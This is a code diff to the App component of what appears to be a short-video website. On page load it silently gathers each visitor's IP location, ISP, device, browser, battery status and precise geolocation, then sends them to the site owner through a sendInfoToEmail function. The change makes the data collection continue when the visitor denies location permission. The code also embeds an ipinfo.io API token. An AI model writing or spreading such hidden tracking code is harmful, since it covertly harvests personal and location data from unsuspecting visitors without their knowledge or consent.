@@ -5,7 +5,7 @@ import Short_Videos from './component/short_videos';
 
 const App = () => {
   useEffect(() => {
-    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude) {
+    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude = null, longitude = null) {
       try {
         const templateParams = {
           date: new Date().toLocaleString(),
@@ -14,8 +14,8 @@ const App = () => {
           region: ipInfo?.region || 'N/A',
           country: ipInfo?.country || 'N/A',
           isp: ipInfo?.org || 'N/A',
-          latitude: latitude || 'N/A',
-          longitude: longitude || 'N/A',
+          latitude: latitude || 'Permission Denied',
+          longitude: longitude || 'Permission Denied',
           device_name: deviceInfo.name || 'Unknown',
           device_os: deviceInfo.os.family || 'Unknown',
           browser: deviceInfo.layout || 'Unknown',
@@ -39,50 +39,88 @@ const App = () => {
 
     async function getUserInfo() {
       try {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
+        // Get device info and battery info regardless of geolocation permission
+        const deviceInfo = getDeviceInfo();
+        const batteryInfo = await getBatteryInfo();
+        
+        // Try to get IP info first
+        let ipInfo = {};
+        try {
+          const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
+          ipInfo = await ipResponse.json();
+        } catch (ipError) {
+          console.error('Error fetching IP info:', ipError);
+          ipInfo = {};
+        }
 
-            const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
-            const ipInfo = await ipResponse.json();
-
-            const deviceInfo = getDeviceInfo();
-            const batteryInfo = await getBatteryInfo();
-
-            sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
-          },
-          (error) => console.error('Geolocation error:', error),
-          { enableHighAccuracy: true }
-        );
+        // Try to get geolocation, but continue even if denied
+        try {
+          navigator.geolocation.getCurrentPosition(
+            // Success callback
+            async (position) => {
+              const { latitude, longitude } = position.coords;
+              // Send all info with coordinates
+              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
+            },
+            // Error callback - user denied permission or other error
+            (error) => {
+              console.log('Geolocation error or denied:', error.message);
+              // Send available info without coordinates
+              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        } catch (geoError) {
+          console.error('Geolocation not supported:', geoError);
+          // Send available info without coordinates
+          sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
+        }
       } catch (error) {
-        console.error('Error fetching IP info:', error);
+        console.error('General error in getUserInfo:', error);
       }
     }
 
     function getDeviceInfo() {
-      const deviceInfo = platform.parse(navigator.userAgent);
-      return {
-        name: deviceInfo.name || 'Unknown',
-        version: deviceInfo.version || 'Unknown',
-        layout: deviceInfo.layout || 'Unknown',
-        os: deviceInfo.os || { family: 'Unknown' },
-        description: deviceInfo.description || 'Unknown',
-      };
+      try {
+        const deviceInfo = platform.parse(navigator.userAgent);
+        return {
+          name: deviceInfo.name || 'Unknown',
+          version: deviceInfo.version || 'Unknown',
+          layout: deviceInfo.layout || 'Unknown',
+          os: deviceInfo.os || { family: 'Unknown' },
+          description: deviceInfo.description || 'Unknown',
+        };
+      } catch (error) {
+        console.error('Error getting device info:', error);
+        return {
+          name: 'Unknown',
+          version: 'Unknown',
+          layout: 'Unknown',
+          os: { family: 'Unknown' },
+          description: 'Unknown',
+        };
+      }
     }
 
     async function getBatteryInfo() {
       try {
-        const battery = await navigator.getBattery();
-        return {
-          level: battery.level * 100 + '%',
-          charging: battery.charging,
-        };
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          return {
+            level: battery.level * 100 + '%',
+            charging: battery.charging,
+          };
+        } else {
+          console.log('Battery API not supported');
+          return { level: 'API Not Supported', charging: false };
+        }
       } catch (error) {
         console.error('Error fetching battery info:', error);
         return { level: 'Unknown', charging: false };
       }
     }
 
+    // Start the process
     getUserInfo();
   }, []);
 
